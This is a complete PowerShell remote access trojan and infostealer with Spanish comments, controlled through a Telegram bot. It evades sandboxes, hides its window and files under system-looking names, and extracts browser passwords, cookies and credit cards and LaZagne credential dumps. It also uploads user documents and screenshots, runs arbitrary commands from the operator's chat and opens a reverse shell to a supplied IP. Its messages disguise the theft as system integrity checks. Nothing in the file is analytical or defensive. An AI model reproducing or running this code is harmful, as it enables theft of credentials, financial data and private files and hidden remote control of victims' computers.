param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

# === CONFIGURACION OFUSCADA ===
$Global:ApiUrl = "https://api.telegram.org/bot$Token"
$Global:BasePath = "$env:APPDATA\Microsoft\Windows\Security\Cache"
$Global:LogPath = "$env:APPDATA\Microsoft\Windows\Security\Logs"
$Global:StateFile = "$Global:LogPath\system.cache"

# Nombres de procesos legitimos
$Global:ProcBrowser = "DllHost.exe"
$Global:ProcPass = "TaskHostW.exe"
$Global:ProcName = "RuntimeBroker"

# Rutas camufladas
$Global:BrowserPath = "$Global:BasePath\$Global:ProcBrowser"
$Global:PassPath = "$Global:BasePath\$Global:ProcPass"

# Crear estructura
New-Item -ItemType Directory -Path $Global:BasePath -Force -ErrorAction SilentlyContinue | Out-Null
New-Item -ItemType Directory -Path $Global:LogPath -Force -ErrorAction SilentlyContinue | Out-Null

# Ocultar atributos
attrib +h +s +r $Global:BasePath 2>$null
attrib +h +s +r $Global:LogPath 2>$null

# Variables de sesion
$script:CurrentDir = $PWD.Path
$script:LastRun = $null
$script:Processed = @{}
$script:Lock = New-Object System.Object
$script:ShellActive = $false
$script:Flags = @{
    BrowserDone = $false
    PassDone = $false
    FilesDone = $false
    BrowserCount = 0
}

# === FUNCIONES OFUSCADAS ===
function Write-SysLog {
    param([string]$Msg)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Msg"
    try { Add-Content -Path "$Global:LogPath\syslog.log" -Value $line -ErrorAction SilentlyContinue } catch {}
}

function Send-TGMsg {
    param([string]$Text)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        $body = @{ chat_id = $ChatId; text = $Text } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$Global:ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
        return $true
    } catch { return $false }
}

function Send-TGFile {
    param([string]$Path, [string]$Caption = "")
    try {
        if (-not (Test-Path $Path)) { return $false }
        $args = @("-s", "-X", "POST", "$Global:ApiUrl/sendDocument", "-F", "chat_id=$ChatId", "-F", "document=@$Path")
        if ($Caption) { $args += "-F", "caption=$Caption" }
        $result = & curl.exe @args 2>&1 | ConvertFrom-Json
        return $result.ok
    } catch { return $false }
}

# === EVASION BASICA ===
function Test-Sandbox {
    $checks = @(
        (Get-WmiObject Win32_ComputerSystem).Manufacturer -match "VMware|VirtualBox|Hyper-V|Xen",
        (Get-WmiObject Win32_BIOS).SerialNumber -match "VMware|VirtualBox",
        (Get-Process | Where-Object { $_.ProcessName -match "vmtools|vmware|virtualbox|xenservice" }).Count -gt 0,
        (Get-WmiObject Win32_VideoController).Name -match "VMware|VirtualBox|Hyper-V"
    )
    return ($checks -contains $true)
}

function Hide-Process {
    # Renombrar ventana de PowerShell
    $hwnd = (Get-Process -Id $PID).MainWindowHandle
    if ($hwnd -ne 0) {
        Add-Type @"
        using System; using System.Runtime.InteropServices;
        public class Win32 {
            [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
        }
"@
        [Win32]::ShowWindow([Win32]::GetConsoleWindow(), 0) | Out-Null
    }
}

# === INFO DEL SISTEMA ===
function Get-SysInfo {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "N/A" }
    try {
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
        $ver = (Get-CimInstance Win32_OperatingSystem).Version
    } catch { $os = "Windows"; $ver = "Unknown" }
    return "Host: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os $ver"
}

# === SCREENSHOT ===
function Get-Capture {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bmp = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $gfx = [System.Drawing.Graphics]::FromImage($bmp)
        $gfx.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        $path = "$env:TEMP\cache_$(Get-Random).tmp"
        $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $gfx.Dispose(); $bmp.Dispose()
        Send-TGFile -Path $path -Caption "Capture $(Get-Date -Format 'HH:mm:ss')"
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        return $true
    } catch { return $false }
}

# === EXTRACCION DE NAVEGADORES ===
function Invoke-BrowserExtract {
    if (-not (Test-Path $Global:BrowserPath)) {
        Send-TGMsg -Text "Error: Componente del sistema no encontrado"
        return $false
    }
    
    Send-TGMsg -Text "Iniciando verificacion de integridad del sistema..."
    Write-SysLog "Iniciando extraccion de datos de navegador"
    
    $types = @{
        "bookmarks" = "bookmark"
        "cookies" = "cookie"
        "downloads" = "download"
        "extensions" = "extension"
        "history" = "history"
        "localstorage" = "localstorage"
        "passwords" = "password"
        "creditcards" = "creditcard"
    }
    
    $outDir = "$env:TEMP\sys_$(Get-Random)"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
    
    try {
        # Cerrar navegadores
        $procs = @("chrome","msedge","firefox","brave","opera")
        $running = Get-Process $procs -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
        
        $p = Start-Process -FilePath $Global:BrowserPath -ArgumentList "dump -d `"$outDir`" -f json" -PassThru -WindowStyle Hidden
        $p.WaitForExit(120000)
        if (-not $p.HasExited) { $p.Kill() }
        
        Start-Sleep -Seconds 2
        
        # Restaurar navegadores
        Get-Process $procs -ErrorAction SilentlyContinue | Where-Object { $running -notcontains $_.Id } | ForEach-Object {
            try { $_.Kill() } catch {}
        }
        
        $files = Get-ChildItem $outDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
        $idx = 0
        
        foreach ($tipo in $types.Keys) {
            $idx++
            $nombre = $types[$tipo]
            $zipPath = "$env:TEMP\sys_$nombre.zip"
            
            $matched = $files | Where-Object { $_.Name -like "*$tipo*" }
            if ($matched) {
                Compress-Archive -Path $matched.FullName -DestinationPath $zipPath -Force
                $size = [math]::Round((Get-Item $zipPath).Length / 1MB, 2)
                Send-TGFile -Path $zipPath -Caption "[$idx/8] SystemCheck: $nombre ($size MB)"
                $script:Flags.BrowserCount++
            } else {
                "No data found for $tipo" | Out-File "$env:TEMP\null.tmp"
                Compress-Archive -Path "$env:TEMP\null.tmp" -DestinationPath $zipPath -Force
                Send-TGFile -Path $zipPath -Caption "[$idx/8] SystemCheck: $nombre (empty)"
                Remove-Item "$env:TEMP\null.tmp" -Force -ErrorAction SilentlyContinue
            }
            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
        }
        
        $script:Flags.BrowserDone = $true
        Save-SystemState
        Send-TGMsg -Text "Verificacion completada: 8 componentes analizados"
        return $true
    }
    finally {
        if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

# === EXTRACCION DE CONTRASEÑAS ===
function Invoke-PassExtract {
    if (-not (Test-Path $Global:PassPath)) {
        Send-TGMsg -Text "Error: Modulo de credenciales no encontrado"
        return $false
    }
    
    Send-TGMsg -Text "Analizando almacen de credenciales del sistema..."
    Write-SysLog "Iniciando LaZagne"
    
    $modules = @("browsers","chats","databases","games","git","mails","maven","memory","multimedia","php","svn","sysadmin","windows","wifi","unused")
    $outDir = "$env:TEMP\cred_$(Get-Random)"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
    
    $idx = 0
    foreach ($mod in $modules) {
        $idx++
        try {
            $outFile = "$outDir\$mod.log"
            $p = Start-Process -FilePath $Global:PassPath -ArgumentList $mod -RedirectStandardOutput $outFile -PassThru -WindowStyle Hidden
            $p.WaitForExit(60000)
            if (-not $p.HasExited) { $p.Kill() }
            
            Start-Sleep -Seconds 1
            
            if (Test-Path $outFile) {
                $content = Get-Content $outFile -Raw -ErrorAction SilentlyContinue
                $hasData = $content -match "Password found|\[\+]" -and ($content.Length -gt 200)
                
                $zipPath = "$env:TEMP\cred_$mod.zip"
                Compress-Archive -Path $outFile -DestinationPath $zipPath -Force
                
                $status = if ($hasData) { "DATA FOUND" } else { "empty" }
                Send-TGFile -Path $zipPath -Caption "[$idx/15] CredStore: $mod ($status)"
                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
            }
        } catch {
            Write-SysLog "Error en modulo $mod`: $_"
        }
        Start-Sleep -Seconds 1
    }
    
    # Ejecutar 'all' como respaldo
    try {
        $allOut = "$outDir\complete.log"
        $p = Start-Process -FilePath $Global:PassPath -ArgumentList "all" -RedirectStandardOutput $allOut -PassThru -WindowStyle Hidden
        $p.WaitForExit(120000)
        if (-not $p.HasExited) { $p.Kill() }
        
        if ((Test-Path $allOut) -and ((Get-Item $allOut).Length -gt 500)) {
            $zipPath = "$env:TEMP\cred_complete.zip"
            Compress-Archive -Path $allOut -DestinationPath $zipPath -Force
            Send-TGFile -Path $zipPath -Caption "[EXTRA] CredStore: Complete dump"
            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        }
    } catch {}
    
    if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
    
    $script:Flags.PassDone = $true
    Save-SystemState
    Send-TGMsg -Text "Analisis de credenciales completado"
    return $true
}

# === EXFILTRACION DE DOCUMENTOS ===
function Invoke-DocExtract {
    Send-TGMsg -Text "Indexando documentos del sistema..."
    Write-SysLog "Iniciando exfiltracion de documentos"
    
    $docs = [Environment]::GetFolderPath("MyDocuments")
    $down = (New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path
    
    $targets = @()
    if (Test-Path $docs) { $targets += $docs }
    if (Test-Path $down) { $targets += $down }
    
    if ($targets.Count -eq 0) {
        $script:Flags.FilesDone = $true
        Save-SystemState
        return
    }
    
    $exts = @('*.docx','*.doc','*.pdf','*.xlsx','*.xls','*.pptx','*.ppt')
    $found = @()
    
    foreach ($target in $targets) {
        foreach ($ext in $exts) {
            try {
                $found += Get-ChildItem -Path $target -Include $ext -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 20
            } catch {}
        }
    }
    
    $unique = $found | Sort-Object FullName -Unique | Select-Object -First 50
    $total = $unique.Count
    $sent = 0
    
    Send-TGMsg -Text "Documentos encontrados: $total"
    
    foreach ($file in $unique | Sort-Object { $_.Extension }) {
        $sent++
        $size = [math]::Round($file.Length / 1MB, 2)
        $ext = $file.Extension.ToUpper().TrimStart('.')
        Send-TGFile -Path $file.FullName -Caption "[$sent/$total] [$ext] $($file.Name) ($size MB)"
        Start-Sleep -Seconds 2
    }
    
    $script:Flags.FilesDone = $true
    Save-SystemState
    Send-TGMsg -Text "Indexacion completada: $sent documentos"
}

# === REVERSE SHELL ===
function Start-RevShell {
    param([string]$IP, [int]$Port = 4444)
    try {
        Send-TGMsg -Text "Estableciendo conexion remota..."
        $script:ShellActive = $true
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        $writer.WriteLine("=== Conexion establecida ===`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME")
        
        while ($script:ShellActive -and $client.Connected) {
            $writer.Write("PS> ")
            try {
                $cmd = $reader.ReadLine()
                if ($cmd -eq "exit") { break }
                if (-not [string]::IsNullOrWhiteSpace($cmd)) {
                    try {
                        $out = Invoke-Expression $cmd 2>&1 | Out-String
                        $writer.WriteLine($out)
                    } catch { $writer.WriteLine("Error: $_") }
                }
            } catch { break }
        }
    } catch {
        Send-TGMsg -Text "Error de conexion: $_"
    } finally {
        if ($stream) { $stream.Close() }
        if ($client) { $client.Close() }
        $script:ShellActive = $false
        Send-TGMsg -Text "Conexion terminada"
    }
}

# === EJECUCION DE COMANDOS ===
function Invoke-SysCmd {
    param([string]$Cmd)
    Write-SysLog "Ejecutando: $Cmd"
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/c $Cmd && cd"
        $psi.WorkingDirectory = $script:CurrentDir
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        $proc.WaitForExit()
        
        if ($Cmd -match '^cd\s+(.+)$') {
            $new = $Matches[1]
            $test = if ([System.IO.Path]::IsPathRooted($new)) { $new } else { Join-Path $script:CurrentDir $new }
            $res = Resolve-Path $test -ErrorAction SilentlyContinue
            if ($res) {
                $script:CurrentDir = $res.Path
                Send-TGMsg -Text "Dir: $script:CurrentDir"
                return
            }
        }
        
        $out = $stdout + $stderr
        if ([string]::IsNullOrWhiteSpace($out)) { $out = "(sin salida)" }
        
        $tmp = "$env:TEMP\out_$(Get-Random).tmp"
        "Cmd: $Cmd`nDir: $script:CurrentDir`n$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$out" | Out-File $tmp -Encoding UTF8
        Send-TGFile -Path $tmp -Caption "Output: $Cmd"
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    } catch {
        Send-TGMsg -Text "Error: $($_.Exception.Message)"
    }
}

# === ESTADO ===
function Save-SystemState {
    $state = @{
        LastRun = if ($script:LastRun) { $script:LastRun.ToString("o") } else { $null }
        FilesDone = $script:Flags.FilesDone
        BrowserDone = $script:Flags.BrowserDone
        PassDone = $script:Flags.PassDone
        BrowserCount = $script:Flags.BrowserCount
    }
    $state | ConvertTo-Json | Out-File $Global:StateFile -Encoding UTF8
    attrib +h +s +r $Global:StateFile 2>$null
}

function Load-SystemState {
    if (Test-Path $Global:StateFile) {
        try {
            $s = Get-Content $Global:StateFile | ConvertFrom-Json
            if ($s.LastRun) { $script:LastRun = [DateTime]::Parse($s.LastRun) }
            if ($s.FilesDone -ne $null) { $script:Flags.FilesDone = $s.FilesDone }
            if ($s.BrowserDone -ne $null) { $script:Flags.BrowserDone = $s.BrowserDone }
            if ($s.PassDone -ne $null) { $script:Flags.PassDone = $s.PassDone }
            if ($s.BrowserCount -ne $null) { $script:Flags.BrowserCount = $s.BrowserCount }
        } catch {}
    }
}

# === FLUJO AUTOMATICO ===
function Start-AutoFlow {
    $now = Get-Date
    
    # Reiniciar cada 14 dias
    if ($script:LastRun -and ($now - $script:LastRun).Days -ge 14) {
        Write-SysLog "Reiniciando ciclo completo"
        $script:Flags.BrowserDone = $false
        $script:Flags.PassDone = $false
        $script:Flags.FilesDone = $false
        $script:Flags.BrowserCount = 0
        $script:LastRun = $null
        Save-SystemState
    }
    
    if (-not $script:Flags.BrowserDone) {
        Write-SysLog "Fase 1: Navegadores"
        if (-not (Invoke-BrowserExtract)) { return }
        Start-Sleep -Seconds 5
    }
    
    if ($script:Flags.BrowserDone -and -not $script:Flags.PassDone) {
        Write-SysLog "Fase 2: Credenciales"
        Invoke-PassExtract
        Start-Sleep -Seconds 5
    }
    
    if ($script:Flags.BrowserDone -and $script:Flags.PassDone -and -not $script:Flags.FilesDone) {
        Write-SysLog "Fase 3: Documentos"
        Invoke-DocExtract
        if ($script:Flags.FilesDone) {
            $script:LastRun = Get-Date
            Save-SystemState
            Send-TGMsg -Text "Ciclo completado. Proximo: 14 dias."
            Write-SysLog "Ciclo completado"
        }
    }
}

# === PROCESAR COMANDOS ===
function Process-TGCmd {
    param([string]$Text, [int]$UpdateId)
    
    [void][System.Threading.Monitor]::Enter($script:Lock)
    try {
        if ($script:Processed.ContainsKey($UpdateId)) { return }
        $script:Processed[$UpdateId] = $true
        if ($script:Processed.Count -gt 100) {
            $keys = $script:Processed.Keys | Sort-Object | Select-Object -First 50
            foreach ($k in $keys) { $script:Processed.Remove($k) }
        }
    } finally {
        [System.Threading.Monitor]::Exit($script:Lock)
    }
    
    Write-SysLog "Cmd: $Text"
    $parts = $Text.Trim() -split '\s+', 2
    $cmd = $parts[0].ToLower()
    $arg = if ($parts.Count -gt 1) { $parts[1] } else { "" }
    
    switch ($cmd) {
        "/help" {
            Send-TGMsg -Text @"
Comandos:
/info - Informacion del sistema
/ls - Listar archivos
/cd <ruta> - Cambiar directorio
/cap - Captura de pantalla
/cmd <comando> - Ejecutar comando
/run - Iniciar ciclo completo
/browser - Solo navegadores
/pass - Solo credenciales
/docs - Solo documentos
/shell <IP> [puerto] - Conexion remota
/stop - Detener shell
"@
        }
        "/info" { Send-TGMsg -Text (Get-SysInfo) }
        "/ls" {
            try {
                $items = Get-ChildItem $script:CurrentDir | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-TGMsg -Text "Dir: $script:CurrentDir`n`n$items"
            } catch { Send-TGMsg -Text "Error" }
        }
        "/pwd" { Send-TGMsg -Text "Dir: $script:CurrentDir" }
        "/cd" { if ($arg) { Invoke-SysCmd -Cmd "cd $arg" } else { Send-TGMsg -Text "Uso: /cd <ruta>" } }
        "/cmd" { if ($arg) { Invoke-SysCmd -Cmd $arg } else { Send-TGMsg -Text "Uso: /cmd <comando>" } }
        "/cap" { Get-Capture | Out-Null }
        "/run" {
            $script:Flags.BrowserDone = $false
            $script:Flags.PassDone = $false
            $script:Flags.FilesDone = $false
            Start-AutoFlow
        }
        "/browser" {
            $script:Flags.BrowserDone = $false
            $script:Flags.BrowserCount = 0
            Invoke-BrowserExtract
        }
        "/pass" {
            $script:Flags.PassDone = $false
            Invoke-PassExtract
        }
        "/docs" {
            $script:Flags.FilesDone = $false
            Invoke-DocExtract
        }
        "/shell" {
            if ($script:ShellActive) {
                Send-TGMsg -Text "Shell activo. Usa /stop primero."
                return
            }
            $args = $arg -split '\s+'
            $ip = $args[0]
            $port = if ($args.Count -gt 1) { [int]$args[1] } else { 4444 }
            if ([string]::IsNullOrWhiteSpace($ip)) {
                Send-TGMsg -Text "Uso: /shell <IP> [puerto]"
                return
            }
            Start-Job -ScriptBlock ${function:Start-RevShell} -ArgumentList $ip, $port | Out-Null
            Start-Sleep -Seconds 2
            Send-TGMsg -Text "Conectando a $ip`:$port..."
        }
        "/stop" {
            $script:ShellActive = $false
            Send-TGMsg -Text "Shell detenido"
        }
        default { Write-SysLog "Desconocido: $cmd" }
    }
}

# === INICIO ===
Hide-Process
if (Test-Sandbox) {
    Write-SysLog "Sandbox detectado, saliendo"
    exit
}

Write-SysLog "=== INICIADO ==="
Load-SystemState
Send-TGMsg -Text "Online: $(Get-SysInfo)`nIniciando verificacion..."

Start-AutoFlow

try {
    Invoke-RestMethod -Uri "$Global:ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
    Start-Sleep -Seconds 2
} catch {}

$lastId = 0
while ($true) {
    try {
        $resp = Invoke-RestMethod -Uri "$Global:ApiUrl/getUpdates?offset=$($lastId+1)&limit=1" -TimeoutSec 60
        if ($resp.ok -and $resp.result.Count -gt 0) {
            $upd = $resp.result[0]
            $lastId = $upd.update_id
            if ($upd.message -and $upd.message.text -and ([string]$upd.message.chat.id -eq $ChatId)) {
                Process-TGCmd -Text $upd.message.text -UpdateId $upd.update_id
            }
        }
        
        if ((Get-Date).Minute -eq 0) {
            Start-AutoFlow
        }
    } catch {
        $err = $_.Exception.Message
        if ($err -notlike "*409*") { Write-SysLog "Err: $err" }
        Start-Sleep -Seconds 2
    }
    Start-Sleep -Milliseconds 1500
}
